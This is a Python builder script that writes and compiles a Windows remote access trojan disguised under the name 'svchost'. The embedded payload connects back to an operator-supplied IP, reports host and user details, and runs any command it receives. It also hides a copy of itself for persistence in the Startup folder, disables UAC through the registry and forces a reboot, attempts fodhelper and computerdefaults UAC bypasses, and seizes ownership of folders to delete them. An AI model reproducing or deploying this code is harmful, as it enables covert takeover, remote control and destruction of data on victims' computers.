from os.path import dirname,join
from os import system
from sys import exit
__author__="Vahab Programmer https://github.com/Vahab-Programmer"
__version="0.0.2"
def remove(path:str)->None:system("del /F /Q \"{}\"".format(path))
def rmdir(path:str)->None:system("rd /S /Q".format(path))
def PyInstaller()->None:
    ip_address=str(input("Server IP:"))
    with open("svchost.py","w") as file:
        file.write(buf%ip_address)
    system("pyinstaller --onefile --windowed --optimize 2 --add-binary \".\\run.exe;.\" svchost.py")
    remove(join(dirname(__file__),"build"))
    remove(join(dirname(__file__),"svchost.spec"))
    exit(0)
buf=r'''from platform import node,release,machine,processor
from ctypes import windll
from pickle import dumps
from subprocess import getoutput,call
from sys import exit,orig_argv,setrecursionlimit
from os import chdir,environ,system as run
from os.path import basename,dirname,join,exists
from socket import socket,AF_INET,SOCK_STREAM,gaierror
from shutil import copyfile
from winreg import OpenKeyEx,HKEY_LOCAL_MACHINE,KEY_WRITE,SetValueEx,REG_DWORD,CloseKey
from psutil import process_iter,AccessDenied,NoSuchProcess
import sys
__author__="Vahab Programmer https://github.com/Vahab-Programmer"
__version="0.0.2"
setrecursionlimit(1000000000)
if hasattr(sys,"frozen"):
    runfile=join(sys._MEIPASS,"run.exe")
else:runfile=join(dirname(orig_argv[0] if hasattr(sys,"frozen") else __file__),"run.exe")
environ["exe"]=" ".join([i for i in orig_argv])
def process_is_double(target:str=None)->int:
    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
    else :target=" ".join([i for i in orig_argv])
    target=target.split(" ")[0]
    process = 0
    try:
        if " ".join([i for i in orig_argv]) == target:
            for i in process_iter():
                try:
                    if i.exe() == target:
                        process +=1
                except AccessDenied:pass
            return process
        for i in process_iter():
            try:
                if i.exe() == target:process +=1
            except AccessDenied:pass
        return process
    except NoSuchProcess:return 0
def process_is_exists(target:str)->bool:return target in (i.name() for i in process_iter())
def split(target:str,tstr:str)->str:
    new_chars=[]
    for i in tstr.lower().split():
        if i.lower() !=target.lower():new_chars.extend([i," "])
    return "".join(new_chars).rsplit(" ")[0]
def connect()->None:
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(999999)
    try:
        s.connect(addr)
        s.send(dumps({"node":node(),"release":release(),"machine":machine(),"processor":processor(),"admin":windll.shell32.IsUserAnAdmin(),"username":environ.get("username")}))
    except TimeoutError:connect()
    except ConnectionRefusedError:connect()
    except gaierror:connect()
    except OSError:connect()
def CYS()->None:
    if exists(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username"))):run("attrib -s -h -r \"{}\"".format(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username"))))
    if exists("C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(orig_argv[0] if hasattr(sys,"frozen") else __file__)):run("attrib -s -h -r \"C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(orig_argv[0] if hasattr(sys,"frozen") else __file__)+"\"")
    run("copy /B /V /Y \"{}\" \"{}\"".format(orig_argv[0] if hasattr(sys,"frozen") else __file__,r"C:\Users\{}\Documents\\"+basename(" ".join([i for i in orig_argv]))).format(environ.get("username")))
    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat".format(environ.get("username")), "wt") as file:
        file.write("""@Echo off
start C:\\Users\\{}\\Documents\\{}
exit""".format(environ.get("username"), basename(" ".join([i for i in orig_argv]))))
    run("attrib +s +h +r \"C:\\Users\\"+environ.get("username")+"\\Documents\\"+basename(" ".join([i for i in orig_argv]))+"\"")
    run("attrib +s +h +r \"C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\start.bat\"".format(environ.get("username")))
def LUA_OFF()->None:
    key = OpenKeyEx(HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\\Policies\\System", 0, KEY_WRITE)
    SetValueEx(key,"EnableLUA",0,REG_DWORD,0)
    CloseKey(key)
    CYS()
    call("shutdown /r /f /t 0")
    exit(0)
def computerdefaults(target:str=None)->None:
    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
    else :target=" ".join([i for i in orig_argv])
    if " ".join([i for i in orig_argv]) == target:
        x=process_is_double()
        while not x<process_is_double():
            call("{} computerdefaults.exe \"{}\"".format(runfile,target))
            if x<process_is_double():return
        return None
    while not process_is_exists(basename(target)):call("{} computerdefaults.exe \"{}\"".format(runfile,target))
def fodhelper(target:str=None)->None:
    if target:target = target + ".exe" if target.split(".")[-1] != "exe" else target
    else :target=" ".join([i for i in orig_argv])
    target= target+".exe" if target.split(".")[-1] !="exe" else target
    if " ".join([i for i in orig_argv]) == target:
        x=process_is_double()
        while not x<process_is_double():
            call("{} fodhelper.exe \"{}\"".format(runfile,target))
            if x<process_is_double():return
    while not process_is_exists(basename(target)):call("{} fodhelper.exe \"{}\"".format(runfile,target))
def FDR(target:str)->None:
    run("takeown /D Y /R /F {}".format(target))
    run("icacls {} /T /C /grant {}:(F,MA)".format(target,environ.get("username")))
    run("rmdir /S /Q {}".format(target))
addr=("%s",8085)
connect()
while True:
    try:
        cmd=s.recv(20971520).decode()
        lcmd=cmd.lower()
        if "cd" in cmd and len(cmd) >2:
            chdir(split("cd",cmd))
            s.send(b"success")
            continue
        if "exit" in cmd:exit(0)
        if "lua" in lcmd:
            s.send("success".encode())
            LUA_OFF()
            continue
        if "computerdefaults" in lcmd and len(lcmd) <17 :
            computerdefaults()
            s.send("success".encode())
            continue
        if "computerdefaults" in lcmd:
            computerdefaults(split("computerdefaults",cmd)[-1])
            s.send("success".encode())
            continue
        if "fodhelper" in lcmd and len(lcmd) <10 :
            fodhelper()
            s.send("success".encode())
            continue
        if "fodhelper" in lcmd:
            fodhelper(split("fodhelper",cmd))
            s.send("success".encode())
            continue
        if "cys" in lcmd:
            CYS()
            s.send("success".encode())
            continue
        if "fdr" in lcmd and len(lcmd) >3:
            FDR(split("fdr",cmd))
            s.send("success".encode())
            continue
        if "refresh" in lcmd:
            s.send("success".encode())
            continue
        if "executable" in lcmd:
            s.send(" ".join([i for i in orig_argv]).encode())
            continue
        if "cmd /c start" in lcmd:
            call(cmd)
            s.send("success".encode())
            continue
        process=getoutput(cmd)
        s.send(process.encode() if process else "success".encode())
    except ConnectionResetError:connect()
    except OSError:connect()'''
print("Checking For PyInstaller")
from PyInstaller import __version__
PyInstaller()
